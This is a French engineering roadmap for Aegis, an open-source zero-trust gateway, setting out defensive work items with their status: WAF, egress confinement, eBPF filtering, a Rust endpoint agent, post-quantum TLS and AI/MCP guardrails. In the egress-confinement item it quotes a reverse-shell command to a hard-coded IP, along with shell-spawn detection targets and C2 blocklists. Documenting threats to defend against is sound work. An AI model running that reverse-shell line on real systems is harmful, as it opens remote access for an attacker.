# 🛡️ Roadmap Technique Aegis — Durcissement Zero-Trust, GreenOps & Sécurité IA

<p align="center">
  <a href="ROADMAP.md">English</a> | <strong>Français</strong>
</p>

Ce document constitue la **source de vérité unique** de la feuille de route d'ingénierie d'Aegis, partagée entre le dépôt open source et l'[étude de cas architecturale AIVO](https://aivo.fr/realisations/aegis-sovereign-gate).

Chaque chantier est suivi strictement par **statut d'implémentation (`✅ Livré`, `🚧 Partiel`, `⏳ Planifié / En conception`)** et **priorité technique (`P0` à `P3`)** — sans dates calendaires fictives — autour de trois objectifs mesurables :
1. Porter le taux de neutralisation face aux techniques d'évasion manuelles (Red Team / Pentest) et failles mémoire de **~78 % à > 95 %**.
2. Déployer une **défense en profondeur « Assume Breach »** couvrant conteneurs, noyau Linux et postes bureautiques (`agent Rust < 10 Mo RAM`), sans taxe SaaS par siège.
3. Étendre le filtrage souverain aux **charges d'IA générative et agentique** (garde-fous anti-exfiltration LLM, sandboxing d'Agent Harnesses, CTI collaborative P2P et micro-SLM `< 1B` sur CPU).

---

## 🧭 Matrice Unifiée des Priorités & Statuts

| Phase | Verrou / Module | Statut | Priorité | Périmètre Codebase | Gain Sécurité & GreenOps Majeur |
| :--- | :--- | :---: | :---: | :--- | :--- |
| **Socle v1** | **WAF Ingress, PHP2Shell VP, Pure BFF & Cockpit RAPL** | **✅ Livré** | **Socle v1** | `gate-proxy`, `backend`, `telemetry-agent`, `web` | Edge PEP `< 1,5 ms` au repos, `HTTP 413` (`32 Ko`), `100 %` blocage PHP2Shell (`0 %` CPU cible), Pure BFF OIDC & certificats RAPL PDF/CSV |
| **P0/P1** | **n°1 Confinement Egress Réseau Strict** | **⏳ À implémenter** | **P0 (Critique)** | `docker-compose*.yml`, `egress-gateway`, eBPF | Bloque les reverse-shells TCP par IP brute sans résolution DNS (réseau `internal: true` + `cgroup/connect4`) |
| **P0/P1** | **n°2 Normalisation Multi-Encodage (Base64 / HTML)** | **🚧 Partiel** | **P1 (Haute)** | `apps/gate-proxy/src/engine/canonicalizer.ts` | Décodage URL 3 passes & purge `/*...*/` **livrés** ; ajout décodage automatique Base64 / Hex / entités HTML |
| **P0/P1** | **n°3 Rate-Limiting Volumétrique & Quarantaine IP** | **🚧 Partiel** | **P1 (Haute)** | `apps/gate-proxy/src/quarantine/ip-reputation.ts` | Blacklist SOC persistante **livrée** ; ajout fenêtre glissante (`60 req/10s`) & auto-bannissement (`< 0,1 ms`) |
| **P0/P1** | **n°4 Durcissement Protocole (`431`) & Anti-Spawn Shell** | **🚧 Partiel** | **P1 (Haute)** | `apps/gate-proxy/src/`, `apps/telemetry-agent` | Virtual Patch `PHP2Shell` & `HTTP 413` **livrés** ; ajout plafonds en-têtes `431` (`8 Ko`), multipart RFC & alerte spawn `/bin/sh` |
| **P0/P1** | **n°5 Audit Passif Continu, PQC (`ML-KEM`) & Remédiation** | **🚧 Partiel** | **P1 (Haute)** | `apps/backend/internal/scanner/` | Scanner passif Go, sonde **PQC `X25519MLKEM768` (FIPS 203)** + snippets TLS & CVE Feed **livrés** ; ajout audits cron planifiés |
| **P2** | **n°6 Filtre Réseau `eBPF / XDP` L3/L4 & Veille Kernel** | **⏳ En conception** | **P2 (Moyenne)** | `apps/telemetry-agent/src/` | Rejet carte réseau `XDP_DROP` (`< 0,005 ms`) contre SYN forgés (LSRR/SSRR) + veille version `uname -r` |
| **P2** | **n°7 Filtrage DNS Entreprise & Shadow IT (DoH/DoT)** | **⏳ À planifier** | **P2 (Moyenne)** | `apps/egress-gateway/src/` | Résolveur central DHCP/`:5053` + DoH/DoT nomade encadrant les outils RAT (TeamViewer, AnyDesk, RustDesk) en Prod/DMZ |
| **P2** | **n°8 Agent Posture Endpoint Rust (`< 10 Mo`) & `mTLS` PQC** | **⏳ En conception** | **P2 (Moyenne)** | Nouveau `aegis-node-agent` (Rust) + `web` | Inventaire CVE local & hygiène poste multi-OS via **canal `mTLS` hybride post-quantique (`X25519MLKEM768`)** + accès conditionnel |
| **P2** | **n°9 Micro-Segmentation ZTNA « Assume Breach »** | **⏳ En conception** | **P2 (Moyenne)** | Architecture réseau & PEP | Supprime les routes L3 bureautique → BDD et détecte les scans ARP/ports internes (Honeypot réseau) |
| **P3** | **n°10 Gouvernance IA « Two-Door » & Zero-Secret Egress** | **⏳ En conception** | **P3 (R&D)** | `gate-proxy` (Ingress) & `egress-gateway` | Garde-fous Prompt Injection en entrée + **Zero-Secret Placeholder** (zéro clé API dans l'agent, anonymisation PII & injection en bordure) |
| **P3** | **n°11 Passerelle MCP Zero-Trust & Registre PQC AI Act** | **⏳ En conception** | **P3 (R&D)** | `gate-proxy`, sonde `seccomp`/eBPF & `backend` | Filtrage granulaire MCP (`tools/list`, `tools/call`) par identité, sandboxing noyau & registre immuable signé **`Ed25519 + ML-DSA` (FIPS 204)** |
| **P3** | **n°12 CTI Collaborative P2P & Micro-SLM `< 1B` CPU** | **🚧 Partiel** | **P3 (R&D)** | `apps/egress-gateway/src/cti/blocklist.ts`, Ollama | Blocklist C2 statique + option **Nimble 9B** (Ollama) **livrés en v1** ; ajout flux Abuse.ch/CERT-FR/CISA KEV, partage P2P & SLM `< 1B` CPU-only |

---

## ✅ Socle v1 / v1.1 Déjà Livré & Vérifié dans le Dépôt

Avant les prochains verrous, les briques suivantes sont **opérationnelles et testées** dans les piles Docker actuelles :

| Pilier | Implémentation Vérifiée dans le Code | Preuves & Métriques Mesurées |
| :--- | :--- | :--- |
| **Ingress PEP & Virtual Patching** | [`apps/gate-proxy/src/server.ts`](apps/gate-proxy/src/server.ts), [`engine/inspector.ts`](apps/gate-proxy/src/engine/inspector.ts), [`engine/entropy.ts`](apps/gate-proxy/src/engine/entropy.ts), [`rules/zeroday.rule.ts`](apps/gate-proxy/src/rules/zeroday.rule.ts) | Benchmark rafale `CVE-2024-4577` PHP2Shell : **`602 / 602` bloquées (`100 %`)**, **`0 %` CPU PHP-FPM**, **`5,81 W` moy.** vs **`24,14 W` moy. (`37,58 W` pic)** et **`743,4 %` CPU** sans bouclier (**`×4,34` d'énergie gaspillée**) |
| **Pure BFF Token Handler** | [`apps/gate-proxy/src/bff/auth-handler.ts`](apps/gate-proxy/src/bff/auth-handler.ts), [`bff/session.ts`](apps/gate-proxy/src/bff/session.ts) | Zéro JWT dans le `localStorage`/JS navigateur ; cookies chiffrés AES-256-GCM (`HttpOnly`) ; compatible Keycloak, Authelia, Okta ou mode autonome |
| **Egress DNS Sinkhole & SLM v1** | [`apps/egress-gateway/src/index.ts`](apps/egress-gateway/src/index.ts), [`dns/udp-server.ts`](apps/egress-gateway/src/dns/udp-server.ts), [`engine/system-one.ts`](apps/egress-gateway/src/engine/system-one.ts) | Sinkhole DNS `:5053` (`0.0.0.0`), entropie de Shannon anti-DGA (`H > 4.2`), blocklist CTI statique + SLM optionnel **Nimble 9B** (`ollama-nimble:11434`) air-gapped |
| **Télémétrie RAPL & Certificat CSRD** | [`apps/telemetry-agent/src/main.rs`](apps/telemetry-agent/src/main.rs), `collector/rapl.rs`, `collector/cpu.rs`, TimescaleDB | Lecture directe `/sys/class/powercap` + `/proc/stat`, support Kepler eBPF sous Kubernetes, exports PDF & CSV conformes Scope 2 / CSRD |
| **Cockpit SOC, Scanner PQC & CVE Feed** | [`apps/backend/internal/scanner/engine.go`](apps/backend/internal/scanner/engine.go), [`scanner/pqc.go`](apps/backend/internal/scanner/pqc.go), [`internal/service/cve_service.go`](apps/backend/internal/service/cve_service.go), `apps/web` | Flux SSE temps réel, audit passif multi-pages (en-têtes, TLS, DNS, EcoIndex, **sonde Post-Quantique NIST FIPS 203 `X25519MLKEM768`**), matrice CVE Feed interactive |

---

## 🔥 Phase P0 / P1 — Durcissement Périmétrique, Egress & Posture Continue

### 🔒 Verrou n°1 : Confinement Egress Réseau Strict (Anti-Reverse Shell par IP brute)
- **Statut :** ⏳ À implémenter
- **Priorité :** Critique (**P0**) — Prérequis avant hébergement de charges tierces / exposition VPS multi-tenant
- **Gain d'efficacité Egress :** Passe de `0 %` à `~98 %` sur les appels TCP sortants vers IP codée en dur sans résolution DNS
- **Écart constaté :**
  [`apps/egress-gateway`](apps/egress-gateway/src/index.ts) filtre les résolutions DNS UDP/TCP (`:5053`) et les inspections HTTP explicites. Toutefois, dans [`docker-compose.yml`](docker-compose.yml) (réseau bridge par défaut) et [`docker-compose.dokploy.yml`](docker-compose.dokploy.yml) (`aegis-internal` sans `internal: true`), un processus compromis invoquant `/bin/sh -i >& /dev/tcp/185.220.101.99/4444` contourne le résolveur DNS.
- **Plan d'action technique :**
  1. Configurer `aegis_internal_sandbox` avec `internal: true` dans Docker Compose (aucune route par défaut vers Internet).
  2. Rattacher bases (`aegis_timescaledb`) et runtimes métier **exclusivement** à `aegis_internal_sandbox`, avec double attachement uniquement pour `aegis_gate_proxy` et `aegis_egress_gateway`.
  3. Forcer le résolveur DNS des conteneurs isolés sur l'IP fixe d'`egress-gateway` (`:5053`).
  4. *(Phase Noyau Hôte)* : Charger un programme eBPF `cgroup/connect4` (`sys_enter_connect`) bloquant tout socket TCP dont l'IP de destination n'a pas été préalablement validée par `egress-gateway` (TTL 60 s).

### 🔒 Verrou n°2 : Normalisation Multi-Encodage Anti-Obfuscation
- **Statut :** 🚧 Partiel (canonisation URL 3 passes, octets nuls & commentaires SQL `/*...*/` déjà actifs)
- **Priorité :** Haute (**P1**)
- **Gain attendu :** **+12 % à +15 %** de couverture face aux contournements WAF manuels
- **État actuel :**
  [`canonicalizeInput`](apps/gate-proxy/src/engine/canonicalizer.ts) applique déjà un décodage URL récursif (3 passes), supprime `%00`/`\0`, neutralise les commentaires SQL inline (`/*...*/`) et normalise les espaces avant l'évaluation dans [`WafInspector.inspect`](apps/gate-proxy/src/engine/inspector.ts).
- **Compléments à implémenter :**
  1. Décodage automatique et ré-inspection des blocs Base64 suspects (`> 16` caractères), séquences hexadécimales et entités HTML/Unicode avant évaluation `ZERODAY_EXPLOIT_REGEX`, `RCE_REGEX` et `SQLI_REGEX`.
  2. Canonisation stricte des séparateurs de chemin (`/./`, `//`, `\`) avant `TRAVERSAL_REGEX`.

### 🔒 Verrou n°3 : Rate-Limiting Volumétrique & Quarantaine IP Automatique
- **Statut :** 🚧 Partiel (blacklist IP dynamique SOC persistante déjà active)
- **Priorité :** Haute (**P1**)
- **Gain attendu :** Neutralise **99 %** du fuzzing automatisé et des rafales de force brute
- **État actuel :**
  [`IpReputationManager`](apps/gate-proxy/src/quarantine/ip-reputation.ts) et [`server.ts`](apps/gate-proxy/src/server.ts) bloquent déjà instantanément les IP bannies par le SOC. En revanche, une IP source non bannie générant un `403` ou `413` n'est pas encore automatiquement mise en quarantaine ni bridée en débit.
- **Compléments à implémenter :**
  1. Limiteur volumétrique à fenêtre glissante (`60 req / 10 s` par IP sur routes dynamiques, retour `HTTP 429`).
  2. **Mécanisme d'Auto-Jail** : toute IP non authentifiée cumulant `3` alertes critiques (`risk_score >= 90`) en moins de `5` minutes passe en quarantaine automatique **15 minutes** (rejet pré-parsing en `< 0,1 ms`).
  3. Exposition du tableau des bans temporaires / expirations dans le Cockpit avec déblocage manuel et remise à zéro via `POST /api/v1/dashboard/reset`.

### 🔒 Verrou n°4 : Durcissement Protocole HTTP (`431`), Multipart RFC & Surveillance Anti-Spawn
- **Statut :** 🚧 Partiel (`Virtual Patch` PHP2Shell & pare-feu volumétrique `HTTP 413 > 32 Ko` déjà actifs)
- **Priorité :** Haute (**P1**)
- **État actuel :**
  [`zeroday.rule.ts`](apps/gate-proxy/src/rules/zeroday.rule.ts) et [`inspector.ts`](apps/gate-proxy/src/engine/inspector.ts) bloquent déjà `CVE-2024-4577` PHP2Shell à `100 %` et rejettent les corps de requête `> 32 Ko` (`HTTP 413`).
- **Compléments à implémenter :**
  1. **Durcissement HTTP dans `gate-proxy`** : plafonnement strict des en-têtes HTTP (`> 8 Ko` global ou `> 4 Ko` par en-tête → `HTTP 431`), conformité stricte `multipart/form-data` (profondeur `<= 3`, bornes RFC valides) et contrôle de ratio anti-bombes de compression.
  2. **Détection de spawn de shell côté hôte** : étendre [`apps/telemetry-agent`](apps/telemetry-agent/src/main.rs) (inspection `/proc`) pour lever une alerte critique dès qu'un worker web (`php-fpm`, `node`, `nginx`) engendre un shell inattendu (`/bin/sh`, `/bin/bash`, `python`).

### 🔒 Verrou n°5 : Supervision Continue des Postures, Sonde Post-Quantique (`ML-KEM`) & Remédiation Guidée
- **Statut :** 🚧 Partiel (scanner passif Go 1.25, sonde **Post-Quantum Readiness `X25519MLKEM768`**, snippets TLS & CVE Feed déjà opérationnels)
- **Priorité :** Haute (**P1**)
- **État actuel :**
  [`apps/backend/internal/scanner/engine.go`](apps/backend/internal/scanner/engine.go), [`scanner/pqc.go`](apps/backend/internal/scanner/pqc.go) et [`cve_service.go`](apps/backend/internal/service/cve_service.go) auditent déjà les domaines à la demande (en-têtes HTTP, DNS hiérarchique RFC 7489/7208, EcoIndex, correspondance CVE, et **handshake TLS 1.3 Post-Quantique NIST FIPS 203 `X25519MLKEM768` (`0x11ec`)** évaluant le risque *Harvest Now, Decrypt Later (HNDL)* avec génération des extraits correctifs Traefik, Nginx, Caddy et Go).
- **Compléments à implémenter :**
  1. **Audits passifs planifiés en continu** : exécution périodique automatisée avec alerte proactive dès détection d'une dérive (port ouvert imprévu, certificat TLS expirant sous 15 jours, régression PQC ou en-tête de sécurité manquant).
  2. **Assistant de remédiation guidée dans le Cockpit** : étendre les snippets prêts au copier-coller (déjà livrés pour le TLS Post-Quantique) à l'ensemble des en-têtes HTTP et directives `php.ini` / Apache directement dans l'interface visuelle du Cockpit.

---

## 🛡️ Phase P2 — Défense Noyau Linux, Agent Endpoint Rust & ZTNA

### 🔒 Verrou n°6 : Filtre Réseau `eBPF / XDP` L3/L4 & Veille Kernel Hôte
- **Statut :** ⏳ En conception
- **Priorité :** Moyenne (**P2** — Hôte Linux / Bare-Metal)
- **Plan d'action technique :**
  1. Charger via [`apps/telemetry-agent`](apps/telemetry-agent/src/main.rs) un programme eBPF `XDP` au niveau du pilote réseau pour jeter (`XDP_DROP` en `< 0,005 ms`) tout paquet IPv4 `TCP SYN` porteur d'options IP obsolètes/malveillantes (`IPOPT_LSRR`, `IPOPT_SSRR`, `IPOPT_RR` — ex. failles kernel TCP UAF telles que CVE-2026-98432).
  2. Remonter automatiquement `uname -r` dans le Cockpit avec alerte de mise à jour noyau lorsque la version hôte est vulnérable.

### 🔒 Verrou n°7 : Filtrage DNS Entreprise Centralisé & Gouvernance Shadow IT
- **Statut :** ⏳ À planifier
- **Priorité :** Moyenne (**P2**)
- **Plan d'action technique :**
  1. Déployer [`apps/egress-gateway`](apps/egress-gateway/src/index.ts) (`:5053`) comme résolveur DNS d'entreprise (DHCP sur site + profils sécurisés **DoH / DoT** en télétravail), préservant la sobriété en évitant la rupture/inspection TLS lourde sur tout le trafic web.
  2. Catégoriser les outils de télémaintenance (**RAT** : TeamViewer, AnyDesk, RustDesk, LogMeIn, VNC) afin d'appliquer des règles par sous-réseau (ex. *interdiction de prise en main sortante depuis la DMZ et les bases de production*) et neutraliser les beacons C2 post-exploitation.

### 🔒 Verrou n°8 : Agent de Posture Endpoint Frugal en Rust (`< 10 Mo RAM`) & Canal `mTLS` Post-Quantique
- **Statut :** ⏳ En conception
- **Priorité :** Moyenne (**P2**)
- **Philosophie :** Remplacer les EDR commerciaux lourds (`1–2 Go RAM` / jusqu'à `50 €/poste/mois`) par un binaire natif Rust (`aegis-node-agent`, `< 10 Mo RAM`, `0 % CPU` au repos).
- **Plan d'action technique :**
  1. Binaire multiplateforme autonome (`systemd` Linux, `launchd` macOS, service Windows) avec enrôlement automatisé par jeton éphémère à usage unique.
  2. Inventaire logiciel local & CVE (ex. détection TeamViewer vulnérable, OpenSSL/sudo/navigateurs obsolètes) + contrôles d'hygiène (chiffrement disque BitLocker/FileVault/LUKS, pare-feu actif, correctifs OS).
  3. **Heartbeat chiffré `mTLS` hybride Post-Quantique (`X25519MLKEM768` — NIST FIPS 203)** (`POST /api/v1/endpoints/posture`) entre les sondes Rust (`rustls-post-quantum`) et le Control Plane Go 1.25 pour immuniser la télémétrie d'infrastructure contre toute collecte rétroactive *HNDL*, couplé à l'accès conditionnel Zero-Trust dans `gate-proxy`.

### 🔒 Verrou n°9 : Micro-Segmentation ZTNA « Assume Breach »
- **Statut :** ⏳ En conception
- **Priorité :** Moyenne (**P2**)
- **Plan d'action technique :**
  1. Supprimer les routes L3 directes entre postes bureautiques / Wi-Fi invités et les serveurs de données (TimescaleDB, PostgreSQL, ERP).
  2. Imposer `gate-proxy` comme point de passage unique MFA + mTLS.
  3. Ajouter une détection locale de scan ARP/ports (Honeypot réseau interne) pour alerter instantanément si un poste bureautique sonde les sous-réseaux serveurs.

---

## 🤖 Phase P3 — Sécurité IA, Passerelle MCP « Two-Door » & CTI Collaborative

### 🔒 Verrou n°10 : Architecture « Two-Door » & Injection Sortante « Zero-Secret Placeholder » (DLP IA)
- **Statut :** ⏳ En conception
- **Priorité :** Évolution Stratégique (**P3 / R&D**)
- **Contexte :** L'adoption rapide des assistants IA et agents connectés aux bases documentaires expose les organisations aux fuites involontaires de secrets, au vol de clés d'API par *Prompt Injection* et aux manipulations d'instructions.
- **Plan d'action technique :**
  1. **Porte 1 — Garde-fous d'entrée (`gate-proxy`)** : détection en bordure de réseau des *Prompt Injections*, tentatives de *Jailbreak* et dépassements de quotas de jetons ciblant les endpoints d'IA applicatifs avant passage aux modèles.
  2. **Porte 2 — Pattern « Zero-Secret Placeholder » & DLP Sortant (`egress-gateway`)** : l'environnement d'exécution de l'agent IA ne détient **aucune clé d'API réelle** en mémoire ou dans ses variables d'environnement (uniquement un jeton fantôme `AEGIS_PLACEHOLDER_KEY`). `egress-gateway` inspecte et anonymise les données personnelles (PII / RGPD), le code propriétaire et les secrets à la volée, puis injecte la véritable clé d'API externe uniquement à la frontière réseau sortante si la requête est conforme.

### 🔒 Verrou n°11 : Passerelle MCP Zero-Trust (Filtrage d'Outils par Identité) & Registre Post-Quantique AI Act
- **Statut :** ⏳ En conception
- **Priorité :** Évolution Stratégique (**P3 / R&D**)
- **Contexte :** Les orchestrateurs multi-agents utilisent le protocole **MCP (*Model Context Protocol*)** pour invoquer des outils sensibles (accès SQL, exécution de scripts, appels API métiers), créant un risque majeur d'élévation de privilèges par injection indirecte.
- **Plan d'action technique :**
  1. **Filtrage granulaire MCP par identité (`tools/list` & `tools/call`)** : inspection native du flux JSON-RPC MCP dans `gate-proxy` pour filtrer dynamiquement la liste des outils exposés et valider chaque appel `tools/call` selon l'identité OIDC / SPIFFE de l'agent ou de l'utilisateur, combinée au *sandboxing* noyau éphémère (`seccomp-bpf`, hooks `eBPF`, `namespaces` Linux).
  2. **Registre de traçabilité immuable à signature Post-Quantique (EU AI Act)** : journalisation cryptographique *append-only* dans TimescaleDB de chaque action d'agent IA, scellée par une **double signature hybride classique + post-quantique (`Ed25519 + ML-DSA-65` — NIST FIPS 204)** garantissant une non-répudiation à long terme conforme à l'**AI Act européen**.

### 🔒 Verrou n°12 : CTI Collaborative P2P & Micro-SLM Frugaux `< 1B` CPU-Only
- **Statut :** 🚧 Partiel (blocklist C2 statique + option **Nimble 9B** Ollama actifs en v1)
- **Priorité :** Évolution Stratégique (**P3 / R&D**)
- **État actuel (v1) :** [`apps/egress-gateway/src/cti/blocklist.ts`](apps/egress-gateway/src/cti/blocklist.ts) embarque une liste CrowdSec / exfil initiale, complétée en option par le service **Nimble 9B** sous Ollama air-gapped (`:11434` dans `docker-compose.yml`).
- **Plan d'évolution :**
  1. **Enrichissement continu automatisé** : synchronisation des flux open source consolidés (**Abuse.ch URLhaus**, **ThreatFox**, **CERT-FR**, **CISA KEV**) en recherche `O(1)` (`< 0,05 ms`, empreinte `< 5 Mo RAM`).
  2. **Réseau de réputation souverain & décentralisé (P2P)** : partage pair-à-pair anonymisé des IP attaquantes et indicateurs C2 confirmés entre nœuds Aegis, sans dépendance à un acteur cloud monopolistique étranger.
  3. **Micro-SLM spécialisés `< 1B` sur CPU** : évolution vers des modèles quantifiés de moins d'un milliard de paramètres exécutables sur CPU standard (*Air-Gapped*, sans ferme de GPU) pour épauler ou remplacer le profil optionnel `Nimble 9B` selon la capacité matérielle.
